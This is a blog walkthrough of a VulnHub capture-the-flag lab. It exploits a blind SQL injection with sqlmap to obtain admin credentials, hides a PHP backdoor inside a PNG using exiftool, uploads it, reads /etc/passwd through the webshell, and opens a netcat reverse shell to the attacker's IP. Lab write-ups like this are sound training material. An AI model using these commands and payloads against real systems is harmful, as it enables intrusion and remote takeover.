<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Pentester Lab: from SQL injection to Shell II (Blind SQL Injection)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-pentester-lab-sql-injection-shell-ii-blind-sql-injection/" rel="bookmark"><time class="entry-date published" datetime="2017-01-16T16:16:09+00:00">January 16, 2017</time><time class="updated" datetime="2025-06-10T20:12:50+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “From SQL injection to Shell II” and you can read part 1 from <a style="color: #000000;" href="http://www.hackingarticles.in/hack-pentester-lab-sql-injection-shell-vm/">here</a>. This VM is developed by Pentester Lab.  You can download it from here: <a style="color: #000000;" href="https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell-ii,69/">https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell-ii,69/</a></span></p>
<p><span style="color: #000000;">Install the iso image in VM ware and start it. The task given in this lab is to gain access to administration console and upload PHP webshell.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Intermediate</span></p>
<h3><span style="color: #000000;"><strong>Penetrating Methodologies</strong></span></h3>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap)</span></li>
<li><span style="color: #000000;">Vulnerable to Blind Time-Base SQL Injection</span></li>
<li><span style="color: #000000;">Exploiting SQL Injection (SQLMAP)</span></li>
<li><span style="color: #000000;">Hiding web shell inside Image (ExifTool)</span></li>
<li><span style="color: #000000;">Uploading Web shell</span></li>
<li><span style="color: #000000;">Spawning Shell (Netcat)</span></li>
</ul>
<p><span style="color: #000000;"><strong>Walkthrough </strong></span></p>
<p><span style="color: #000000;">The target holds 192.168.1.102 as network IP; now using nmap lets find out open ports.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.102</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-f-52_MVBRlE/W3-cm3HoIPI/AAAAAAAAZ3w/J-WE7o0yvbcHS5Dqb-OQ6Dk9D3Ub8nITACEwYBhgL/s1600/2.png"/></p>
<p><span style="color: #000000;">Since port for HTTP is open, so we explored target IP in the web browser and welcome by My Awesome Photoblog web page. It contains some tags: home; test; </span>ruxcon<span style="color: #000000;">; 2010; all pictures; admin. Click on <strong>the test</strong>.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-aS2ko6VEDAg/W3-cnHhUe3I/AAAAAAAAZ3w/NVswnAVXn5I-ASgWac-1qdGgKFdg5CaugCEwYBhgL/s1600/3.png"/></p>
<p><span style="color: #000000;">The given URL: http://192.168.1.102/cat.php?id=1 will run SQL query for ID 1 now let try to find out whether the above URL is vulnerable to SQL injection or not by adding(‘) apostrophe at last of URL:</span></p>
<p><span style="color: #000000;">Unfortunately, this page is not vulnerable to error based SQL injection as the author already mentioned here you will learn “Blind SQL injection exploitation using time-based exploitation Gaining code execution using a PHP webshell”</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-BwxmumOZd9c/W3-cnTobegI/AAAAAAAAZ3g/CISt7ehMmfoQkEHruyXC1ZzHE-CmWJugQCEwYBhgL/s1600/4.png"/></p>
<p><span style="color: #000000;">Then I had used acunetix to scan the target which has declared the level of threat is high for blind SQL injection.</span></p>
<p><span style="color: #000000;">Hence it is clear that exploit the target through SQL injection.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-_Q2Jrf4DMto/W3-cnYd-JAI/AAAAAAAAZ3k/8QMPtE8VJeYdJkV3PCJpVID9pT5usL_oACEwYBhgL/s1600/5.1.png"/></p>
<p><span style="color: #000000;">And after little more research work, I found the way to exploit it using sqlmap.</span></p>
<pre class="lang:default decode:true">sqlmap -u http://192.168.1.102/cat.php?id=1 --headers=”X-Forwarded-For: *” --dbs --dump-all --batch</pre>
<p><span style="color: #000000;">If you remembered the title of the web page was “An Awesome Photoblog” hence name of the database must be a photoblog.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-hmOqOiQ6W20/W3-coGlQ8YI/AAAAAAAAZ3w/9C_uiwPdY4ofitLBCRtXLZEZV92IX3jGQCEwYBhgL/s1600/5.png"/></p>
<p><span style="color: #000000;">Now let’s fetch entire data under photoblog database through the following command:</span></p>
<pre class="lang:default decode:true">sqlmap -u http://192.168.1.102/cat.php?id=1 --headers=”X-Forwarded-For: *” -D photoblog --dump-all --batch</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-WA-FEZt39wA/W3-cn5eHLEI/AAAAAAAAZ3o/bVox2DB5KVgnbshL5gBzUxo5HU8Ek49pQCEwYBhgL/s1600/6.png"/></p>
<p><span style="color: #000000;">Now try to use above credential to access administration console, again open target IP: 192.168.1.102 in the browser and click on login tab and type login as admin and password as P4ssw0rd.</span></p>
<p><span style="color: #000000;"><strong>Congrats!!! The first task is completed.</strong></span></p>
<p><span style="color: #000000;">Now the last task is to upload PHP webshell. Under administration console, you will see a link Add a new picture to upload an image in this web server. Click on Add a new picture to upload an image.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-3_XM1Qr5xUA/W3-coBw7E8I/AAAAAAAAZ3s/qD6DCvvm9q0HiGPwuZdc0uqR0QSqJe4gwCEwYBhgL/s1600/7.png"/></p>
<p><span style="color: #000000;">I tried to upload php malicious file using .php extension; double extension .php.jpg; also used case sensitive extension like PHP, pHP but every time failed to upload backdoor and following web page gets open.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-GxnRQmRAUCs/W3-cocqRdBI/AAAAAAAAZ3w/jSeANaGmEvsuBmlFgECGCYEMO9QsGbFhQCEwYBhgL/s1600/8.png"/></p>
<p><span style="color: #000000;">Then I use ExifTool to bind a malicious php file which will generate a remote code execution vulnerability, once get uploaded. To perform this I downloaded an image “<strong>1.png</strong>” and copied <strong>simple-backdoor.php</strong> from this path: /usr/share/webshells/php/ on the desktop for binding it with downloaded image.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-5qdMBK6EeD4/W3-cow1o8OI/AAAAAAAAZ30/AtUF_uQlqt8k1iAyAWonoYG6zqHFr6w5wCEwYBhgL/s1600/9.png"/></p>
<p><span style="color: #000000;">Now type command for ExifTool to hide malicious code of php file inside the png image.</span></p>
<pre class="lang:default decode:true">cd Desktop
exiftool "-comment&lt;= simple-backdoor.php" 1.png
exiftool 1.png</pre>
<p><span style="color: #000000;">As you can observe, the malicious code is hidden inside the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-6g8XbtRvJt4/W3-clK8t4lI/AAAAAAAAZ3g/LxWiwKf14vQ_WRoioos0Po74ElOOkzoNwCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now I had browse <strong>1.png</strong> to add it as a new image which is our php webshell.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-yJbkSQmCj_c/W3-ck2hvCtI/AAAAAAAAZ3s/31tl92xDZGEZYTSfBKfx2lodfeqN-O_WgCEwYBhgL/s1600/11.png"/></p>
<p><span style="color: #000000;">Our malicious file successfully uploaded on the web server. You can see a new row is added as webshell php which contains our php backdoor, now click on the backdoor.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-l8E7jbDUWMc/W3-clBOnTAI/AAAAAAAAZ3o/58jcuoWWRdYM4Z89Pja6s8HU4lJ2nDPYwCEwYBhgL/s1600/12.png"/></p>
<p><span style="color: #000000;">Yuppie we have uploaded the image with hidden backdoor inside, now try to execute it.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-MYZ_Vnr3QU8/W3-cld40mTI/AAAAAAAAZ3o/3jOvogx46KEj8lLxvTlL6O83o8SbWVWZQCEwYBhgL/s1600/13.png"/></p>
<p><span style="color: #000000;">After inspecting its source code we found link uploaded image, now let’s try to open it.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ocQP_8gCCJM/W3-clpgonwI/AAAAAAAAZ3c/4UTkaIL7Wckuy9fyDJfPwf3tm3SJ3iG-QCEwYBhgL/s1600/14.png"/></p>
<p><span style="color: #000000;">As we knew the image contain a web shell that will allow remote code execution, therefore, after exploring above enumerated path, I try to get /etc/passwd file.</span></p>
<pre class="lang:default decode:true">http://192.168.1.102/admin/uploads/1534177197.png/cmd.php?cmd=cat+/etc/password</pre>
<p><span style="color: #000000;">And you can observe, we have successfully pulled the passwd file successfully, hence now can spawn victim’s shell through it.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-rlCEaS7Wr58/W3-cmFW-A2I/AAAAAAAAZ3k/eaISC2cKWt4lVxpxRnUqQnlpY7ae_fbyQCEwYBhgL/s1600/15.png"/></p>
<p><span style="color: #000000;">Let’s run netcat listener in the terminal and execute netcat reverse connection for spawning web shell.</span></p>
<pre class="lang:default decode:true ">nc -lvp 6666
http://192.168.1.102/admin/uploads/1534177197.png/cmd.php?cmd=nc 192.168.1.105 6666 -e /bin/sh</pre>
<p><strong> <img decoding="async" src="https://1.bp.blogspot.com/-BvYKwvpD9Z8/W3-cmKOXtJI/AAAAAAAAZ3c/hpURvSfiGsMfwVZLU9Co3xKE51y4uBjMgCEwYBhgL/s1600/16.png"/></strong></p>
<p><span style="color: #000000;">Superb!!! We completed our last challenge also here we have spawned victim web shell.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-KNrRjMVfZtU/W3-cmblqJ3I/AAAAAAAAZ3c/VvSHYFlygfwSPGjhJFVktITCcdNHR4a7wCEwYBhgL/s1600/17.png"/></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
